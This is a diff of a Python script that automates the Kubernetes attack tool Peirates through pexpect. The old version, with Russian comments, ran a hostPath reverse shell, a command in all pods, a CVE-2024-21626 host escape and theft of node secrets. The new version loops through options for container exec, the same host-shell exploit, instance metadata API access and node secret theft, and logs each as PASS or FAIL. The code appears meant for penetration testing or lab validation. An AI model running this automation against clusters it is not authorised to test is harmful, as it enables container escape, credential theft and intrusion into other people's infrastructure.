@@ -1,82 +1,116 @@
 #!/usr/bin/env python3
 import os
-import subprocess
+import pexpect
+import time
 
-# Directory for logs
-LOG_DIR = "./logs"
+LOG_DIR = "/usr/local/bin/logs"
 os.makedirs(LOG_DIR, exist_ok=True)
 
-def write_to_log(filename, content):
-    """Записывает вывод команды в лог-файл."""
-    with open(filename, "w") as log_file:
-        log_file.write(content + "\n")
+MAIN_LOG_FILE = os.path.join(LOG_DIR, "peirates_results.log")
+PASS_LOG_FILE = os.path.join(LOG_DIR, "peirates_passed.log")
 
-def run_command(command):
-    """Выполняет команду и возвращает вывод."""
+def log_message(message, log_file=MAIN_LOG_FILE):
+    print(message)
+    with open(log_file, "a") as f:
+        f.write(message + "\n")
+
+def restart_peirates():
+    log_message("[+] Restarting Peirates...")
+    return pexpect.spawn("peirates", timeout=120)
+
+def safe_decode(data):
+    return data.decode() if data else ""
+
+def execute_peirates_commands():
     try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("utf-8")
-        return output
-    except subprocess.CalledProcessError as e:
-        return f"Error: {e.output.decode('utf-8')}"
+        child = restart_peirates()
+        time.sleep(3) 
 
-def execute_peirates_action(action_number, additional_input=None):
-    """Выполняет конкретное действие утилиты peirates."""
-    print(f"[+] Executing Peirates action {action_number}...")
-    command = f"peirates {action_number}"
+        commands = [
+            {"option": "22", "name": "Exec via API", "vector": "Exec into container", "post_processing": None},
+            {
+                "option": "23",
+                "name": "Exploit CVE-2024-21626",
+                "vector": "Host Shell Access",
+                "post_processing": lambda child, name, vector: handle_host_shell_exploit(child, name, vector),
+            },
+            {
+                "option": "12",
+                "name": "Access Metadata API",
+                "vector": "Instance Metadata API",
+                "post_processing": lambda child, name, vector: handle_generic_analysis(child, name, vector, "failed"),
+            },
+            {
+                "option": "30",
+                "name": "Steal Secrets from Node Filesystem",
+                "vector": "List K8S Secrets",
+                "post_processing": lambda child, name, vector: handle_generic_analysis(child, name, vector, "path does not exist"),
+            },
+        ]
 
-    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    stdout, stderr = process.communicate(input=additional_input)
+        for cmd in commands:
+            log_message(f"[+] Running command: {cmd['name']} ({cmd['vector']})")
+            child.sendline(cmd["option"])
+            time.sleep(3) 
 
-    if process.returncode == 0:
-        return stdout
+            result = safe_decode(child.before)
+            if cmd["post_processing"]:
+                cmd["post_processing"](child, cmd["name"], cmd["vector"])
+            else:
+                analyze_result(cmd["name"], cmd["vector"], result)
+
+            child.sendline("")  
+            time.sleep(2)
+
+     
+            if cmd["option"] == "22":
+                child.close()
+                child = restart_peirates()
+                time.sleep(3)
+
+        child.sendline("exit") 
+        child.close()
+        log_message("[+] Peirates execution completed.")
+
+    except pexpect.exceptions.TIMEOUT:
+        log_message("[-] Error: Timeout while interacting with Peirates.")
+    except Exception as e:
+        log_message(f"[-] Error: Unexpected exception occurred: {e}")
+
+def analyze_result(command_name, vector, result):
+    if not result:
+        log_message(f"[FAIL] {command_name} exploitation failed.")
+    elif "failed" in result.lower() or "refused" in result.lower() or "error" in result.lower():
+        log_message(f"[FAIL] {command_name} exploitation failed:\n{result}")
     else:
-        return stderr
+        log_message(f"[PASS] {command_name} ({vector}) exploitation succeeded.")
+        log_message(f"[PASS] {command_name} ({vector}) exploitation succeeded.", log_file=PASS_LOG_FILE)
 
-def perform_attack_20():
-    """Выполняет атаку 20 (обратная оболочка через hostPath)."""
-    print("[+] Performing attack 20: Reverse shell using hostPath pod...")
-    output = execute_peirates_action(20)
-    write_to_log(os.path.join(LOG_DIR, "attack_20.log"), output)
-    print("[+] Attack 20 completed. Log saved to attack_20.log.")
 
-def perform_attack_21():
-    """Выполняет атаку 21 (запуск команды во всех подах)."""
-    print("[+] Performing attack 21: Running command in all pods...")
-    additional_input = "2\necho 'Testing Peirates Command'\n"
-    output = execute_peirates_action(21, additional_input)
-    write_to_log(os.path.join(LOG_DIR, "attack_21.log"), output)
-    print("[+] Attack 21 completed. Log saved to attack_21.log.")
+def handle_host_shell_exploit(child, command_name, vector):
+    try:
+        time.sleep(3)  
+        result = safe_decode(child.before)
+        if "permission denied" in result.lower():
+            log_message(f"[FAIL] {command_name} exploitation failed: insufficient permissions.")
+        else:
+            analyze_result(command_name, vector, result)
+    except Exception as e:
+        log_message(f"[-] Error during Host Shell Exploit handling: {e}")
 
-def perform_attack_23():
-    """Выполняет атаку 23 (CVE-2024-21626 - доступ к хосту)."""
-    print("[+] Performing attack 23: Attempting privilege escalation via CVE-2024-21626...")
-    output = execute_peirates_action(23)
-    write_to_log(os.path.join(LOG_DIR, "attack_23.log"), output)
-    if "Permission Denied" in output:
-        print("[-] Attack 23 failed: Permission Denied.")
-    else:
-        print("[+] Attack 23 completed. Log saved to attack_23.log.")
-
-def perform_attack_30():
-    """Выполняет атаку 30 (кража секретов из файловой системы узла)."""
-    print("[+] Performing attack 30: Stealing secrets from the node filesystem...")
-    output = execute_peirates_action(30)
-    write_to_log(os.path.join(LOG_DIR, "attack_30.log"), output)
-    if "path does not exist" in output:
-        print("[-] Attack 30 failed: Path does not exist.")
-    else:
-        print("[+] Attack 30 completed. Log saved to attack_30.log.")
-
-def main():
-    print("[+] Starting Peirates attacks...")
-
-    # Выполняем атаки
-    perform_attack_20()
-    perform_attack_21()
-    perform_attack_23()
-    perform_attack_30()
-
-    print("[+] All Peirates attacks completed. Check logs for detailed results.")
+def handle_generic_analysis(child, command_name, vector, fail_message):
+    try:
+        time.sleep(3)  
+        result = safe_decode(child.before)
+        if fail_message in result.lower():
+            log_message(f"[FAIL] {command_name} ({vector}) exploitation failed: {fail_message}.")
+        else:
+            analyze_result(command_name, vector, result)
+    except Exception as e:
+        log_message(f"[-] Error during analysis: {e}")
 
 if __name__ == "__main__":
-    main()
+    log_message("[+] Starting Peirates automation...")
+    execute_peirates_commands()
+    log_message(f"Peirates automation finished. Logs saved to {MAIN_LOG_FILE}.")
+
